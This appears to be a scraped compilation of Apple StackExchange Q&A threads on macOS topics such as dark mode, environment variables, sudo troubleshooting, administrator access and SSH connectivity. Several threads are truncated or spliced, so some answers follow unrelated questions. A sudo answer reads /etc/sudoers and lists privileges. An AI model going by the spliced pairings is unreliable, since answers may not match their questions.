I recently switched to macOS Mojave Dark Mode, and I like many aspects of it.\nBut there's one thing that really gives me trouble, i.e., using the App Switcher in front of a window that is mainly dark/black.\nWhen I use the keyboard shortcut, Command + Tab to invoke the App Switcher, the switcher highlights the currently selected app using a black frame. Black frames do not work too well when they are used transparently above black background.\nI did then turned to the Accessibility settings to Reduce transparency but that actually made things worse.\nIs there a way to somehow fix this problem?\n(I installed HyperSwitch as a workaround. The UI part works much better there for me, but the actual logic of app switching is \"wrong\" when using multiple screens, so that renders it a no go for me)\nTwo screenshots are shown below.

That product works fine for my requirements. It appeared to be dead, but after months of no activity, a new version was released March 2021.\n", "Q: Internet Sharing Over Ethernet I am attempting to share the WiFi connection on my MacBook Air running Mojave over Ethernet. In other words, Computer #1 connects via Ethernet to Computer #2 and Computer #2 is doing Internet Sharing with Wi-Fi\nI am able to successfully connect another computer via Ethernet but I can only ping the machine itself, I can't get out to the Internet. Firewall is disable, as is Little Snitch.\n\n\n\nAny suggestions on what I could be doing wrong?\n\nA: Your first screenshot shows (I think) that you have configured Computer #1 with a manually entered IP address of 192.168.70.1. It's been a while since I played with this, but I dug into some of the details of Internet Connection Sharing a while ago - see an answer I wrote back in 2014 here: https://apple.stackexchange.com/a/135163/22953.\nWhen Internet Connection Sharing is turned on on Computer #2, that machine will have two IP addresses - one for WiFi and one for Ethernet. Each will be in a different subnet. For example: WiFi gets 192.168.61.x, and Ethernet gets 192.168.2.y.\nComputer #1 will need an IP address in the same subnet as the Ethernet interface on Computer #2... so 192.168.2.z.\nWhen I wrote that answer in 2014, it seemed likely that the Ethernet subnet here would be 192.168.2, not 192.168.70. I think if you set Computer #1 to configure \"Using DHCP\" instead of \"Manually\", I hope it should be assigned an address like that automatically.\n\nA: Ashley's answer is very good.\nAlternatively (if there are issues putting both networks in the 192.168.61.xxx range from your router), you can try choosing an address outside the dhcp range of your router (likely something above 192.168.61.200, check or change router settings).\nOr you can try to widen the ip address range of your computer and the ones attached to your Thunderbolt port by changing the subnet mask to 255.255.0.0. This should allow you to keep the 192.168.70.xxx IP addresses on your \"middleman\" computer and to manually assign the other computers in your net a 192.168.61.xxx IP address (again, outside the dhcp range which should be set to below 192.168.61.200). If you have a second router between the middleman computer and the others, that also needs the changed subnet mask, better with DHCP turned off and a static external IP address in accordance with your Thunderbolt network or your internet router (would have to test such a setup to be sure). If you don't, you might want to change the router address to your actual router (192.168.61.1), which the widened subnet mask makes possible, or leave the router out, if the system allows.\n", "Q: Strange circular USB icon in Finder I've got a minor problem which has been irritating me for some time. Whenever my Mac has a USB storage device mounted in Finder, it shows a circle instead of the usual USB icon. \nI'm not sure when this started (Mac is running 10.14.4 at the moment), but it is consistent with all storage devices and it's strange because the icon appears normally both at the top of Finder and on the Desktop.\nPlease see the images below for clarity:\n\n\nDoes anyone have any idea why it is the case that this strange circle appears as the icon in the side bar for all USB storage devices? \nIf so, is there a way I can restore the standard USB icon you would expect (and can see at the top of the Finder window)?\n\nA: I have those now, too. I assumed the sidebar icon had just been changed to those circles in a recent update. \n\nAs far as I know, the default sidebar icons are still located here:\n/System/Library/CoreServices/CoreTypes.bundle/Contents/Resources/\n\nYou should be able to swap any or all of them out for any icons you want. Just give your new icon the same name as the one you are replacing and make sure it is a .icns file. You will probably need to disable SIP in order to do this. \nEDIT: On closer look, I don't see any dots amongst the default sidebar icons in CoreTypes. I wonder if it may have something to do with disk permissions....\n\nA: These icons are a bug caused by the app What's Your Sign?. Uninstall the app, reboot, and your Finder sidebar volume icons should return to normal. There's an open issue for this bug at the What's Your Sign? github so it doesn't appear as if the issue is fixed even in the most recent release.\n", "Q: GMail on one Mac (only!) stopped working this week I have a GMail account, and I access it from two Macs, and an iPhone.

I'm confused regarding what options I have to be able to keep working on my work computer.\n\n\n\nAccording to DiskSweeper, this is how my 500GB disk space is used:\n\nBesides from things that cannot be backed up (applications, library, system...) most of the data is my working files.\nIn my workflow as a designer, I often open old projects for insight or to reuse previous assets.\nIf I made a hard drive copy and then deleted it from my laptop, I'd have to plug the hard drive in every time I need to consult an old project or do a search, and I'd have to know exactly what I recently modified each time I want to do a backup.\nIf I made a Cloud copy and then deleted from my laptop, I'd often have to download very large files just to get previews of large files or videos (for example Backblaze doesn't offer file thumbnails).\nIf I used Time Machine, then got rid of the files on my HD, some of the oldest versions would disappear after a while when Time Machine runs out of space or notices I deleted them from my HD.\nAre there other options out there that are not too complicated, and would allow me to have a full copy of my work as accessible as possible, but not hosted on my computer's HD?\n\nA: First step would be to go through your files and get rid of things you no longer need.  An app like GrandPerspective can make it easy to locate files that are taking up a lot of space.\nIf you’ve cleaned your drive of all unwanted files and you still don’t have enough space, then you should consider replacing your internal drive with a larger capacity drive.  Just make sure to get one big enough that you won’t fill it up for quite a while.\nIf you don’t want to replace your internal drive, then the next best option is an external drive.  As for the caveats you mention, you could just leave the drive mounted all the time.  That way the files are always available to you when you need them.  And for keeping track of files that need to be backed up, just get a good backup app, like ChronoSync.  They are designed to keep track of modified files and back them up on whatever schedule you designate.\n\nA: Also, you probably should read this information about the ideosyncracies of APFS.\nI'm not sure I like it, but it's good to know.\n", "Q: Connecting external display to Early 2015 MacBook Pro Does Early 2015 MacBook Pro output 4K 3840 via Mini DisplayPort to DisplayPort?

It also seems every old method has become outdated.\nI want to add an environment variable ENV_VAR=12345 to my Mac, so that I can import it into a Python module using os.environ['ENV_VAR']\nThe most relevant tutorial I have found is this, but it doesn't quite do the trick for me.

Luckily the syntax of the changes is basically the same, just different files. So you can add the above example to this file instead:\n$ echo 'export ENV_VAR=12345' >> ~/.zshenv\n\nAnd then when you launch a zsh:\n$ echo $ENV_VAR\n12345\n\nReferences\n\n\n*\n\n*Zsh Startup Files\n\nA: The other solutions describe how to set an environment variable in all your zsh/bash shell instances.  But they don't set a permanent ENV that's available everywhere on in macOS, including in every launched program.\nFor example, if you define ENV_VAR=1 your .zshrc but you launch Python directly without launching it from a shell, then anything set in your .zshrc wouldn't be available in os.environ['...'].\nTo solve this, you can set a truly global environment variable on macOS at the system wide level using launchctl like this:\nlaunchctl setenv \"ENV_VAR\" \"12345\"\n\nAfter running that, every newly launched program will see the ENV_VAR environmental variable, including shell instances as well as things launched without a shell. You will need to close your terminal app and re-open for it to be in your shell. It also won't show up in ssh sessions, which aren't launched by launchd like GUI programs.\nUpdate: It seems that this does not persist across system restarts.  You can find some discussion for that here. Funnily, a decent solution to this is just to put launchctl setenv ... in your shell's  .zshenv or .bash_profile.  Though that means you'll need a launch a shell before the global vars are set, so you can see some more robust solutions that involve creating a new launchd job here.\n\nA: First, execute in a terminal with zsh (Z Shell):\necho 'export ENV_VAR=12345' >> ~/.zshenv\n\nThen, reload changes:\nsource ~/.zshenv\n\nFinally, test if your new variable is set:\necho $ENV_VAR\n\nNote: \nBy standard, the .zshenv file should only contain environment variables setting commands. .zshenv is sourced on all invocations of the shell, hence it will persist even after you restart your machine. \n\nA: For what it's worth, I use this portable shell function to quickly set & permanently add environment variables.\nI predominantly use zsh, but it can be easily adapted for bash or other POSIX-compliant shells.\n# -----------------------------------------\n#  Create permanent environment variable\n#\n#  $1 - variable name\n#  $2 - variable definition\n#  @requires: '~/.zshrc' or '~/.bashrc'\n# -----------------------------------------\nfunction new_env_var {\n  local detected_shell=\"$(ps -o comm= -p $$)\"\n  local rcfile=$(echo \"${HOME}/.${detected_shell//-/}rc\")\n  if [[ -f $rcfile ]]; then\n    local var_name; local var_val\n    if [ -z \"$1\" ]; then\n      echo \"variable name (e.g. 'NEW_VAR' for '\\$NEW_VAR'):\"; read var_name\n    else\n      var_name=$1\n    fi\n    if [ -z \"$2\" ]; then\n      echo \"variable definition:\"; read var_val\n    else\n      local s2 var_val=\"${@//${var_name}/}\"\n      until s2=\"${var_val#[   ]}\"; [ \"$s2\" = \"$var_val\" ]; do var_val=\"$s2\"; done\n    fi\n    echo \"export $var_name=\\\"$var_val\\\"\" >> $rcfile; export $var_name=\"$var_val\"\n  else\n    echo \"No $detected_shell runcom file found. Please make sure $rcfile exists.\"\n  fi\n}\n\nYou can use it like so:\n  ‣  new_env_var MY_ENV_VAR 9,999\n\nA: shows all hidden files like .bash_profile and .zshrc\n$ ls -a \nStarting with macOS Catalina, macOS uses zsh instead of bash for newly created accounts.\nCheck which shell running:\n$ echo $SHELL\n/usr/zsh\n\n$ cd $HOME\n$ open -e .zshrc\n\nor if using vim\n$ vi .zshrc\n\nThen add it like this\n$ export my_var=\"/path/where/it/exists\"\n$ export PATH=$PATH:/$my_var/bin\n\nFor example: if installed app named: myapp in /Applications\nThen\nexport MYAPP_HOME=/Applications/myapp\nexport PATH=$PATH:$MYAPP_HOME/bin\n\nor shortcut\nexport PATH=${PATH}:/Applications/myapp/bin\n\n\nA: The file names used to set environment variables differ depending on which shell you use.  By default, the mac assigns the bash shell to new users.  echo $SHELL if unsure.  \nFrom here, check the man page.  e.g.: man bash and it will document the files it will execute at runtime.  You can add an environment variable to one of those files.  \nFor bash, make sure you export the variable or it wont be inherited by a child process.  e.g.: export ENV_VAR=12345 or ENV_VAR=12345; export ENV_VAR\n\nA: UPDATE: read the comments to @slm's answer.  I should have been editing ~/.zshrc not ~/.bash_profile, because I use zsh.  The more you know!  The below answer also seemed to work, but hacky.\n\nThanks to @Tim Campbell and @slm, I was able to get something working.\nBackground\necho $0 outputs -zsh\necho $SHELL outputs /bin/zsh\necho $PATH outputs /usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin:/opt/X11/bin\n\nMy \"Hacky\" Solution\nI made a shell script configure_env.sh and put in in ~/Documents\n#!/bin/zsh\nexport ENV_VAR=12345\n\nI then ran chmod +x ~/Documents/configure_env.sh\nI then did nano ~/.bash_profile and appended source ~/Documents/configure_env.sh\nThen, when I typed echo $ENV_VAR, it returned 12345\n:) thank you again to Stack Overflow!\n", "Q: Admin password not working for sudo?

groups of users access to elevated functions without having to reveal the Administrator's credentials. Therefore the password you'll want to use when prompted by the sudo command is in fact your user's password.\nAdditionally you can use the switch -l to sudo to see what specific permissions your user ID has been granted.\nFor example:\n$ sudo -l\nPassword:\nMatching Defaults entries for joeuser on unagi:\n    env_reset, env_keep+=BLOCKSIZE, env_keep+=\"COLORFGBG COLORTERM\", env_keep+=__CF_USER_TEXT_ENCODING, env_keep+=\"CHARSET LANG LANGUAGE LC_ALL LC_COLLATE LC_CTYPE\", env_keep+=\"LC_MESSAGES LC_MONETARY\n    LC_NUMERIC LC_TIME\", env_keep+=\"LINES COLUMNS\", env_keep+=LSCOLORS, env_keep+=SSH_AUTH_SOCK, env_keep+=TZ, env_keep+=\"DISPLAY XAUTHORIZATION XAUTHORITY\", env_keep+=\"EDITOR VISUAL\", env_keep+=\"HOME\n    MAIL\", lecture_file=/etc/sudo_lecture\n\nUser joeuser may run the following commands on unagi:\n    (ALL) ALL\n\nThe above is stating that the user joeuser has all permissions, (ALL) ALL, on the system. \nIdea #2 - Lacking sudo permissions\nIf you're finding that your password is correct, then it's likely that your account simply doesn't have an entry in Sudo's configuration files giving the user any permissions to use. To confirm this you can try running the command visudo to view Sudo's configuration file:\n$ visudo\n...\n##\n# Cmnd alias specification\n##\n# Cmnd_Alias    PAGERS = /usr/bin/more, /usr/bin/pg, /usr/bin/less\n\n##\n# User specification\n##\n\n# root and users in group wheel can run anything on any machine as any user\nroot        ALL = (ALL) ALL\n%admin      ALL = (ALL) ALL\n\n## Read drop-in files from /private/etc/sudoers.d\n## (the '#' here does not indicate a comment)\n#includedir /private/etc/sudoers.d\n\nNOTE: visudo is merely opening the file /etc/sudoers in vi in a protected manner so that no 2 users can stomp on it at the same time.\nIdea #3 - Group membership\nTypically with user's being granted access to sudo they'll be added to a special UNIX group called admin. You can confirm if your account is a member of this group like so:\n$ id -a | grep -o '[0-9]\\+(admin)'\n80(admin)\n\nThis group is special since it's typically what shows up in the system's /etc/sudoers file granting users admin access via sudo via this line:\n$ cat /etc/sudoers\n...\n...\n%admin      ALL = (ALL) ALL\n...\n...\n\nIdea #4 - TextExpander\nI was able to find threads where other people were reporting that TextExpander was auto capitalizing the first word in a sentence, which was causing the first letter of their password to be capitalized when they would type it. You can disable TextExpander to see if this is the cause of your password issues with sudo.\n\n\n*\n\n*Password not working with Sudo\n\n*Admin Password Stopped Working In The Terminal\n\n*TextExpander - Help: Expanding Snippets\nIdea #5 - Corrupt account or password\nThere's a slight chance that your user's password may have become corrupt in      some capacity which is rendering sudo unable to use it. To help eliminate this as a possible cause you can try resetting/changing your user's password. To do so access the Systems Preferences and then open up Users & Groups and select your user and click the Change Password button.\nAdditionally you may find some success with attempting to follow some of the steps in this guide titled: How-To Fix Corrupt User Accounts in macOS\n if you suspect your macOS user account has become corrupt.\nNOTE: I'd save this last suggestion as something to try once you've completely eliminated everything else.\nIdea #6 - Create another account\nTo eliminate any issues with the system itself, you may want to try creating another macOS user account and grant this user sudo access as well. Once you've created this account, attempt to use sudo -l and verify that it functions. If it does not, then your issue is likely with the system either being mis-configured or perhaps some files/libraries that are critical to sudo have become corrupt.\nIdea #7 - An issue with certain commands\nI noticed someone asking you in comments about how you were able to run the command sudo -l and provide your password, but in subsequent commands such as sudo ls it failed. \nThis got me to thinking that perhaps your issue has something to do with an alias, shell function, or shell script that's getting picked up when you run sudo ls.\nTo investigate this idea a bit more you can do the following:\n$ set -x; sudo -l; sudo ls; set +x \n\nThis will enable more verbose output from commands. The set -x is what enables this. The set +x at the end will disable this.\nIn between we'll run the sudo -l and the sudo ls commands so we can see what commands are actually getting run when these execute.\nFor example:\n$ set -x; sudo -l; sudo ls; set +x\n+ sudo -l\n...\n...\n+ sudo ls\n...\n...\n+ set +x\n\nYour output should look the same, if you see something other than sudo ls then you may have an alias or shell function that's inhibiting your ability to run sudo ls.\n\nA: For whatever reason you seem to have the targetpw option set.

I've been given a new MacBook Pro at work, and it has an administrator account which I assume the IT department has the credentials to. I have been created a local account which is also an administrator.\nI'm just wondering, as another administrator, what of my data can they access and read? I have iCloud Drive and other services turned on, and I don't particularly like the idea that someone can go in and grab that stuff.\n\nA: Short answer: Generally an administrator account can access and read any file on the computer. To protect files, either remove all untrusted admin accounts except for yours or encrypt the specific files you need protected with your admin password. Another admin can reset your password, but not see it to unlock things like your keychain. Of course a new password for encryption is ideal if you don’t trust another admin.\nThere are certain files within your account that are encrypted and can not be read without your password.\nThe main file I'm thinking of is the \"Keychain\" which may contain your iCloud password and any other passwords you've allowed Safari (or other apps) to remember.\n\nAs an IT system administrator myself I would recommend not to store personal data on your work computer that you don't want anyone else to see.\nThe computer may have backup software that's backing up all files on the computer - including your iCloud Drive.\nAlso remember that if you're fired, the computer may be taken away before you have a chance to remove your personal files.\n\nA: This document provided by Apple titled: Set up users, guests and groups on Mac covers the types of privileges each user type is allowed.\n\nAdministrator: An administrator can add and manage other users, install apps and change settings. The new user you create when you first set up your Mac is an administrator. Your Mac can have multiple administrators. You can create new ones, and convert standard users to administrators. Don’t set up automatic login for an administrator. If you do, someone could simply restart your Mac and gain access with administrator privileges. To keep your Mac secure, don’t share administrator names and passwords.\n\nExpanding on this, basically an Administrator can access any of your files and pretty much do anything on the system.\nReferences\n\n\n*\n\n*Protect files from other administrator accounts\n\nA: An Administrator account should be able to install software to log keystrokes, a keylogger.  With your keyboard input captured, any passwords input would be captured and could be used to open otherwise secure applications and files.  I cannot say whether Apple prevents their use on macOS, but anyone sufficiently determined would be able to circumvent such restrictions.\nAlso, screen capture software can often be used to determine what keystrokes have been made, especially on mobile devices where the on-screen keyboard keys pop-up as typed.\nIt is not your computer.  Treat it as such.\n", "Q: AppleScript to Add Multiple Files to VLC From List Results I have a FileMaker Pro database of music files which uses AppleScript to pass it's search results into an iTunes playlist.\nI would like to use VLC instead of iTunes to play the audio files since I have a number of FLAC files which iTunes will not play.\nI haven't been able to figure out how to pass the AppleScript results to VLC.

However, I do not have that application nor do I know what your code is to search the database file, so I \"hard coded\" the file list just for example purposes.\nset theSongs to {\"NoDoubt:Music:Rock Pop:ABC:The Beatles:Abbey Road:01_come_together_alac.m4a\", ¬\n    \"NoDoubt:Music:Rock Pop:DEF:Fleetwood Mac:Rumours:01_second_hand_news_alac.m4a\", ¬\n    \"NoDoubt:Music:Rock Pop:MNO:Van Morrison:hymns_to_the_silence_disc_1:1-02_i'm_not_feeling_it_anymore_alac.m4a\", ¬\n    \"NoDoubt:Music:Rock Pop:PQR:Pink Floyd:Wish You Were Here:04_wish_you_were_here_alac.m4a\"}\n\nset theSongsAlias to {}\n\nrepeat with thisSong in theSongs\n    set end of theSongsAlias to alias thisSong\nend repeat\n\ntell application \"VLC\" to open theSongsAlias\n\n", "Q: Rotate the Quote Bubble shape in Keynote for macOS The Keynote app for macOS offers a couple of its basic shapes for thought-bubbles (speech-balloon), one is oval, the other rectangular.\n\nNotice that both point to the left. \n➥ How to make them point in other directions, up, down, or to the right? \nWhen I try flipping them or rotating them (hold down Command while dragging a corner), the text flips or rotates as well.

I recently ran an update to Mojave 10.14.4, and following this update, I was prompted by \"Internet Accounts\" to re-authorise access to my Google account.\n\nNotice that I only wish to syncrhonise Calendars and Notes in this panel, and not my Mail or Contacts. My concern is that, when I proceed to opening Safari and enter my credentials to authorise access, this is what the permission request looks like:\n\nAs you can see, the request includes full access to my email account. I have tried disabling the synchronisation of my Notes, but this does not seem to change the request. \nIt would appear then, that following the update to Mojave 10.14.4, \"macOS\" requests a blanket permission to my Google account regardless of my sync preferences. I would like to know why that is, and if there is any way to only give access to what I would like to sync, and nothing more.\n\nA: A Google account, whether added for Contacts, Calendars, Emails, or all of the above, is added the same way and requests permissions for all three. You then enable or disable them on the settings panel you see in the background.\nIt will not interact with your email if you leave the Mail checkbox off\n", "Q: Renamed /etc folder. I can't login anymore I did a silly thing by renaming the /etc folder. I was asked for the admin password to change the folder's name. But it's not possible to rename it back to /etc. As if my password was wrong.\nI assume the association between password and username is stored in this folder. I can still change the admin's password in the system settings. But I can't login to the advanced options that expect admin rights.\nUnfortunately I don't have a recent time machine backup to replace the /etc folder.\nNow I'm concerned about rebooting my Mac, as I'm not sure if I'll be able to login again.\nHow do I fix this issue?\n\nA: I would try booting in single user mode (holding the Apple and S keys while rebooting), mount the hard drive (mount -uw /) and then check and rename etc as needed (there should be an alias at the root of the HD named etc pointing to /private/etc).\nI would do an ls -al / and a ls -al /etc to see which directory name was changed and then fix the bad directory name with mv. Checking each directory would be important regardless of which fix you used (the one above or below).\nIf single user boot doesn't work, I would “Target Disk Mode” using another Mac (turn off the bad Mac, connect the two Macs with Firewire or Thunderbolt cable, start the bad Mac while holding down the T key), this will mount the bad Mac's drive as an external drive on the other Mac and you should be able to use the command line to change the name there.\nOr, as someone else suggested, booting from the recovery partition.\nLast resort is to reinstall the system, it should allow you to do that without wiping the drive.\n", "Q: Preview virtual spaces in menu bar (like ubuntu) Is it possible to have a preview of the virtual spaces in the menu bar, like this https://github.com/maho2nd/enhanced-ubuntu-workspace-indicator?\n                       \nMore generally, I'd like to know which spaces are clear and which are occupied.\nNOTE: I'm already using WhichSpaces but it only gives the current space as an index.\n\nA: Googling I was able to find this commercial app that looks like it does what you want.

The person helping me at the Sprint store transferred all my photos from Android phone onto their computer, and then to my iPhone.\nI need to get these photos off of my iPhone, but they don't show up in iTunes, and neither in my iCloud. What can I do other than sending myself hundreds of emails with the photos attached?\n\nA: If you are able to view the photos in Photos app, an easier approach would to use a cloud storage service such as Dropbox or Google Drive.\nJust create a free account with either one of them, install the iOS client app. Both the apps offer photo sync service where they upload the contents of Camera roll onto their server.\nOnce you have all the photos backed up, you can simply install the client app on your PC and sync off the photos to your computer.\n\n\n*\n\n*Dropbox - iOS app\n\n*Google Drive - iOS app\n\nA: The trick here is to duplicate these transferred (aka. synced) photos. This makes them appear in camera roll and then you can access these photos in well known ways.\nThe process of duplication is described in this answer: How to convert synced photo folders to camera roll folders?\nBasically you open the folder with the synced images, select all of them, then tap on share icon and then tap \"Duplicate\".\n", "Q: What are possible reasons for external keyboard input lag?

It is strange, thought, that the lag occurrences are not connected to higher load on the CPU or memory.\n\nA: The lagging sounds like wireless interference to me.\nMany devices can be the culprit; wireless routers, displays, other Bluetooth and WiFi enabled devices, and even devices attached via USB 3.0 cables with poor shielding.\nThe closer you can get your USB dongle to the keyboard, and the further it can be from sources of interference, the better. A good USB extension cable might be what you need to take care of this issue.\n\nA: I had the same issues:\n\n\n*\n\n*Severe lag for keyboard/mouse\n\n*Eventual complete disconnections\n\n\nApparently I fixed it by disabling handoff.\nI read it somewhere but I cannot find it.\n\nA: I think it might be wireless interference. I have a pair of bluetooth headphones and the lag only seems to happen with the headphones are connected to the computer. I've had this keyboard and mouse combo for a couple of years and think the two are highly related.\nI'm not sure how to resolve the issue though, but I will investigate some more and hope to provide updates in the future.\n\nA: USB 3 hubs can interfere with 2.4 GHz dongles, like the one from your keyboard. I had exactly the same issue with the exact same keyboard.\nSolution: connect the dongle of the keyboard to a USB extension (one foot, 30 cmts) so it's farther away from the USB C hub.\nLesson learned: never connect the Microsoft dongle directly to a USB C hub, or any other dongle for that matter.\nSources:\nhttps://www.reddit.com/r/technology/comments/136g7y/usb_30_has_been_found_to_cause_interference_that/\n\nA: I started having issue this morning, mine was resolved by setting Key Repeat to off in keyboard setting.\n", "Q: Terminal PATH startup message I messed up when installing Cisco Packet Tracer for Linux and it some how changed a few bash files.

It was a freeware game. I would like to study the game's design.\nFirst of all, if I were to find a copy of the game IPA file Online, would that be considered piracy?\nSecondly, assuming such activity is not illegal, are there any libraries of ancient app IPA files?\n\nA: \nFirst of all, if I were to find a copy of the IPA file online, would that be considered piracy?\n\nIt won't constitute piracy, primarily because the iOS App Store ecosystem has been designed from the ground up to curb attempts at pirating apps. Even if you manage to find the IPA of the said app, you won't be able to load it on an iOS device. Side-loading app like in Android is not generally possibly in iOS.\n\nSecondly, assuming such activity is not illegal, are there libraries that .IPAs of ancient iOS apps?\n\nNo. There isn't any such library/website which will let you download the IPA file for desired app.\n\nYour best bet would be search the Web for reviews/videos of the game app in action. That way you would be able to study the design at-least in a limited/indirect way.\nAdditionally, considering the app was discontinued around 2012 which were the days of iOS 6/iOS 7, it's highly likely that the app was developed using a now ancient iOS SDK and using older 32-bit architecture. Even if we hypothetically assume that you'll be somehow able to get hold of the IPA and load it on a device, it won't be possible to run in on a modern device (running iOS 11 or later), which is now installed on around 95% of active devices.\n\nSource: App Store - Support - Apple Developer as on 10 April 2019.\n\nP.S.: Quoting @Tetsujin from the comment below:\n\nIf it's that old & has been unsupported for 6 or 7 years, it might even be worth seeing if the original dev would be willing to give away the old source code.

In my home LAN, I develop websites and have set up my router to forward external SSH calls to my main laptop from this external port. \nSo if I'm logged into a customer's computer I would ssh, or scp\n$ ssh -p 7219 sam@mycomcastip\n\nwhich worked well until a few weeks ago when I upgraded it to Mojave. Now the connection times out. Here's my steps to isolate the issue:\n$ ssh -p 7220 sam@mycomcastip\n\nworks because my router port forwards it as port 22 to an older machine running High Sierra. Maybe my router is goofed? I thought so, so I installed OpenWRT on it (which is very good, so far) and I cannot ssh into the laptop from outside as I could before.\nPerhaps Comcast is blocking port 7219? It if was, it would be blocking port 7220 and it's not blocking it. Changing the port forward to another port fails with the same timeout.\nPerhaps it's my SSH daemon that's goofed? Changing the port forward to route to the laptop's port 80 (which has Apache running), instead of 22 yields no difference in the result.\nI can confirm that inside my LAN I can SSH into this laptop with no issues. That assures me that the laptop's ssh daemon is running. I have no trouble ssh out from this machine.\nI can confirm the router is not doing the blocking because I can run tcpdump on the router looking for this port and it receives it and passes it on. \nI've run tcpdump on this laptop and examining the PCAP in Wireshark I can see the packet coming in on port 22 and subsequent attempts by the remote operator retrying the connection, but I just haven't found the right tutorial on analyzing a packet for this issue to help me see what might be the cause.\n\n41    3.349934    remoteIP    192.168.1.105   TCP 74  45166 → 22 [SYN] Seq=0 Win=14600 Len=0 MSS=1460 SACK_PERM=1 TSval=1415111467 TSecr=0 WS=512\n\nPerhaps someone can shed light on what this means?\nI attempted to install Mojave on another machine to see if it is a Mojave issue but every other machine is too old to run it so I'm unable to isolate that it's the hardware or software on this machine. Speaking of which, this behavior occurs when I'm routing to the laptop through the wireless and Ethernet/Thunderbolt of the laptop which would suggest that if it's hardware, it's not the networking ports causing the issue.\nSince the port forwarding rules are the same except for the source and destination ports, I'm leaning on thinking something changed in Mojave as that's the only change I've recall that I made to the laptop when this capability broke.\nLooking online, I found the closest which suggests that Apple has closed off certain folders to remote users. Except as this poster determines, SSH gets around this block so that may not be it.\nhttps://www.sentinelone.com/blog/mojaves-security-hardening-user-protections-bypassed/\nI discovered a clone of this machine on High Sierra before I upgraded it to Mojave. Running off that clone, the expected behavior occurs. Running tcpdump on this laptop I can see the TCP passed through the router to this laptop from the remote server and I can see my laptop is ACK in return, which confirms what I saw when I SSH in from remote. That seems to eliminate that it's my firewall on the router that is blocking any of these odd ports to this laptop. Which points more likely that Mojave is blocking port 22 from outside its subnet.\nI can show screen cap that shows this Mojave firewall is turned off if important.\nThat's why I ask here, instead of another networking forum as it seems to be only the Mojave OSX machine that is rejecting port 22. What other troubleshooting steps should I try?\n\nA: 1. SSH key bit length\nIs your SSH key bit length > 2048? You can use this command to confirm.\n$ ssh-keygen -lf ~/.ssh/id_rsa.pub\n4096 SHA256:0f7e9153ec1edf81c224fec24c76d3ab1be7010e joeuser@dom.com (RSA)\n\nIf it's less macOS will refuse to allow it. \n2. Cipher Suite Support\nAlso you should investigate from the client where you're running SSH which cipher suites are being presented to your laptop's SSH server. You can do this using ssh -vvvv .... to see what ciphers are available on your client like so:\n$ ssh -Q cipher\n3des-cbc\naes128-cbc\naes192-cbc\naes256-cbc\nrijndael-cbc@lysator.liu.se\naes128-ctr\naes192-ctr\naes256-ctr\naes128-gcm@openssh.com\naes256-gcm@openssh.com\nchacha20-poly1305@openssh.com\n\nYou'll also want to investigate several other components of the cipher suite.\n\n\n*\n\n*Ciphers: ssh -Q cipher\n\n*MACs: ssh -Q mac\n\n*KexAlgorithms: ssh -Q kex\n\n*PubkeyAcceptedKeyTypes: $ ssh -Q key\n\n\nThe man page's details on -Q as well:\n\n -Q query_option\n         Queries ssh for the algorithms supported for the specified version 2.  The available features\n         are: cipher (supported symmetric ciphers), cipher-auth (supported symmetric ciphers that sup-\n         port authenticated encryption), mac (supported message integrity codes), kex (key exchange\n         algorithms), key (key types), key-cert (certificate key types), key-plain (non-certificate\n         key types), and protocol-version (supported SSH protocol versions).\n\n\n3. IPQoS\nThere have been reports from newer versions of OpenSSH pertaining to connectivity issues. I've found these as examples:\n\n\n*\n\n*SSH fails on macOS Mojave 10.14.1\n\n\n*OpenSSH 7.8 causes VMware Workstation and Player networking SSH bug on Linux VMs #287\n\n*SSH connections dropped due to QoS flags\nThe workaround requires adding the following to your ~/.ssh/config:\n$ cat ~/.ssh/config\n...\n...\nHost *\n  IPQoS throughput\n\nI've seen variations of this so you may need to try low instead of throughput. You can consults the man ssh_config for more details, here's the excerpt for that option:\n\n IPQoS   Specifies the IPv4 type-of-service or DSCP class for connections.  Accepted values are af11,\n         af12, af13, af21, af22, af23, af31, af32, af33, af41, af42, af43, cs0, cs1, cs2, cs3, cs4,\n         cs5, cs6, cs7, ef, lowdelay, throughput, reliability, a numeric value, or none to use the\n         operating system default.  This option may take one or two arguments, separated by white-\n         space.  If one argument is specified, it is used as the packet class unconditionally.  If two\n         values are specified, the first is automatically selected for interactive sessions and the\n         second for non-interactive sessions.  The default is af21 (Low-Latency Data) for interactive\n         sessions and cs1 (Lower Effort) for non-interactive sessions.\n\n\nYou can of course pass it via CLI like so as well:\n$ ssh -o IPQoS=throughput joeuser@192.168.1.1\n\nIf find you're not having any luck with the above you may want to try this form instead:\nHost *\n     IPQoS lowdelay throughput\n\nSeveral threads mention this form working as well.\nReferences\n\n\n*\n\n*ssh man page\n\nA: There's a key statement in your question that jumps out:\n\nI can confirm that inside my LAN I can SSH into this laptop with no\n  issues. That assures me that the laptop's ssh daemon is running. I\n  have no trouble ssh out from this machine.\n\nThis confirms that it can't be a Mojave issue.  Mojave is accepting SSH connections.  However, that doesn't rule out other services running on the Mojave machine.\nYour testing with tcpdump and setting up a different machine with port forwarding rules confirms that it's not the router.\nYour comment re: running in Safe Mode led you to the VPN client software which seemed to be the culprit.\nVPN software (per it's configuration) can redefine the gateway for traffic.  Based on what you've described, it sounds like traffic bound for port 22 was properly being forwarded, but the VPN software was responding via the VPN gateway, not back to the router, thus the time out.\n", "Q: Apple Numbers, matching string variations in a SUMIFS function I'm using a SUMIFS function to get values from a column in another table depending on if they have a certain string in a corresponding memo column. I'd like to be able to check for a few variations on the string, i.e. \nSUMIFS(Amount-column, Memo-column, \"this-string*\"||\"that-string*\")\n\nAnyone know how to do this?\n\nA: Sorry to bring bad news, but there simply is no suitable formula, in-place ORing, or list comparison of that type in Numbers.\nOf the common workarounds for similar spreadsheet problems, I find the \"helper column\" approach to be the most straightforward and maintainable. Create a new column to calculate whether or not that row should count in the later summing. The helper column can then be the condition source in your sumif formula, and hidden.\nFor example, helper-column cell D2 could be:\nOR(  IFERROR(SEARCH(\"This*\",C2),FALSE)  ,  IFERROR(SEARCH(\"That*\",C2),FALSE)  )\nand after populating that down the rows, your count formula could be:\nSUMIF(helper-column,helper-column,Amount-column)\n\n\nA: Compounding SUMIF statements with SUM will work as well without chewing up an intermediate results column.

